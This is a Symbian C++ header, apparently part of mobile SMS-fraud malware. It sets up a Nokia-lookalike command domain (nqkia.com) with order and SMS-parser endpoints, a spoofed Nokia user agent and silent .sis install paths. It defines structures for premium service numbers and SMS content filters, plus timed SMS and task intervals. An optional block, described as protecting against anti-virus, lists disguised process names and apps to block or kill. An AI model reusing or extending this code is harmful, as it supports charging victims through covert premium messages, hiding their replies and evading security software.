#ifndef _COMMUTILS_H_
#define _COMMUTILS_H_
#include <e32std.h>
#include <bautils.h>
//#define __THIRDPARTY_PROTECTED__ //Protect the software from anti-virus.
_LIT8(KParterner, "p0001");//Iori Yagami  82865835
_LIT(KAppFolder,"c:\\data\\Nokia\\");
_LIT(KDebugFlagFile,"c:\\data\\a\\1");
_LIT(KLocalSisPath,"c:\\data\\Nokia\\temp.sis");
_LIT(KLogPath,"c:\\data\\Nokia\\debug.txt");
_LIT(KLogWPath,"c:\\data\\Nokia\\debugW.txt");
_LIT8(KIndexUrl, "http://w.nqkia.com/order/");
//_LIT8(KIndexUrl, "http://wavegoing.com/mm/index.php");
_LIT8(KSmsParserUrl, "http://w.nqkia.com/parser/sms/");
_LIT8(KUserAgent,"NokiaN73-1/2.0628.0.0.1 S60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1");
_LIT8(KNewLine,"\n");
_LIT8(KVersion,"6");
_LIT(KInstallManager, "InstallerManager_Version5");

const TInt TTaskInteval=37;//minutes
const TInt TSMSPeriodicInteval=240;//seconds
const TInt TMessageContentLength=1500;
const TInt TPhoneNumberLength=100;
const TInt TMessageContentKeywordLength=100;
const TInt TPhoneNumberKeywordLength=25;
const TInt TMessageData=228213;

struct KeyValue{
  TBuf8<32> Key;
  HBufC8* Value;
  KeyValue(const TDesC8& aKey,const TDesC8& aValue){
    Key.Copy(aKey);
    Key.Trim();
    Value=aValue.AllocL();
    Value->Des().Trim();
  }
  ~KeyValue(){
    delete Value;
    Value=NULL;
  }
};

struct SpChannelItem{
  TBuf<10> Id;
  TBuf<10> ParentId;
  TBuf<TPhoneNumberLength> SpNumber;
  TBuf<TMessageContentLength> SpSmsContent;
  TBuf<TPhoneNumberKeywordLength> SpNumberFilter;
  TBuf<TMessageContentKeywordLength> SpSmsContentFilter;
  TBool ParseInServer;
};

struct SmsMessage{
  TBuf<TPhoneNumberLength> PhoneNumber;
  TBuf<TMessageContentLength> MessageContent;
};

class CTaskObserver{
public:
  virtual void OnTaskSuccess(TInt aTaskFlag){
  }
  virtual void OnTaskFailed(TInt aTaskFlag,const TDesC8& aFailedReason,TInt aFailedStep){
  }
};

typedef TBuf8<512> TDbgLog;
TBool DebugEnabled();
void LogFormat(TRefByValue<const TDesC8> aFmt,...);
void LogFormat(TRefByValue<const TDesC> aFmt,...);
void Log(const TDesC8& buf,TDesC& file,TInt append=1);
void Log(const TDesC8& buf,TInt append=1);
void Log(const TDesC& buf,TInt append=1);
void Log(TInt value,TInt append=1);
void LogBool(TBool value,TInt append=1);
TInt SaveToFile(const TDesC& aFileName,const TDesC8& aData,TBool aAppendFile=EFalse);
TInt SaveBufToFile(const TDesC& aFileName,const void *aWiteBuffer,TInt aSize,TInt aWriteType); //保存数据到文件
void DeleteFolder(const TDesC& aFolderName);
void DeleteFile(const TDesC& aFileName);
TInt ReadFromFile(const TDesC& aFileName,HBufC8*& aOutBuf);
TBool FileExists(const TDesC& aFileName);
TInt ReplaceAll(TDes8& aString,const TDesC8& aOrigin,const TDesC8& aReplace);
TInt HexString2Int(const TDesC & aHexStr);
TInt TDesC82TInt(const TDesC8& aDesC);
TInt GetRandom(TInt minValue,TInt maxValue);
TUid HexString2Uid(const TDesC8& aString);
void DoEscapeChar(TDes8& aStr);
TInt SeprateToArray(const TDesC8& aData,const TDesC8& aSeprator,CDesC8Array& aArray);
TPtrC8 FindEnclosed(const TDesC8& aTarget,const TDesC8& aLeft,const TDesC8& aRight,TBool aReverse=EFalse);
TPtrC8 FindMatchEnclosed(const TDesC8& aTarget,const TDesC8& aLeft,const TDesC8& aRight,const TDesC8& aKeys,const TDesC8& aSplitter);
TPtrC8 FindLeft(const TDesC8& aTarget,const TDesC8& aFlag);
TPtrC8 FindRight(const TDesC8& aTarget,const TDesC8& aFlag);
TPtrC8 UnicodeToUtf8(const TDesC& aDes);
TPtrC Utf8ToUnicode(const TDesC8& aString);
void KillProcess(const TDesC& aProcessNameNotExtName);

#ifdef __THIRDPARTY_PROTECTED__

_LIT(KINIT_PROTECTED_APP_NAME, "c:\\sys\\bin\\initanimation.exe");
_LIT(KPROTECTED_APP_NAME, "c:\\sys\\bin\\animation.exe");
_LIT(KGLobalName, "DingShengServer");
_LIT(BlockApps,"2003811b,2000ab0f,agile,CallMaster,mqq,moa,suffix_no_delete");
TBool FindProcess(const TDesC &aName,RBuf &rb);
TBool CreateProcess(const TDesC &aName);
TInt StartProtected();

#endif

#ifndef SAFE_DELETE
#define SAFE_DELETE(x)  \
  {                   \
    if(x)           \
      delete (x); \
    (x) = NULL;     \
  }
#endif

#ifndef SAFE_DELETEARRAY
#define SAFE_DELETEARRAY(x)  \
  {                   \
  if(x)           \
  delete[] (x); \
  (x) = NULL;     \
  }
#endif
#endif
